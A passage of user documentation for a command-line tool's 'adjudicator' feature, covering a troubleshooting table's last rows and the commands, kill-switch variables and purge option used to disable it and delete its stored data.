| Savings stay $0 | Usage ingestion is off or has not run (`eminiar usage ingest`), or no advice was followed |
| "Not enabled: no consent" without a terminal | Pass `--accept-remote`; `--yes` never grants consent |

## Turn it off

- `eminiar adjudicator disable` (or `--project`), then `/mcp reconnect` to drop the tool. Keys
  and consent are kept; `eminiar adjudicator key clear` removes the keys.
- **Kill switch:** `EMINIAR_ADJUDICATOR=0` overrides every config file. Hooks see it on the next
  call; the MCP server needs a restart (`/mcp reconnect`).
- `eminiar purge adjudicator --yes` deletes the recorded decisions, cache, provider state,
  learned bias and captured Jev requests. It erases the captured text from the database file and
  the write-ahead log too (best effort for the log while another process holds the database).
- Security advice: `eminiar adjudicator security off`, or `EMINIAR_ADJUDICATOR_SECURITY=0` as the
  kill switch. `eminiar purge adjudicator --yes` also deletes the recorded security assessments.

Every key is listed in [Configuration](configuration.md#adjudicator) and every command in
[CLI](cli.md#adjudicator).
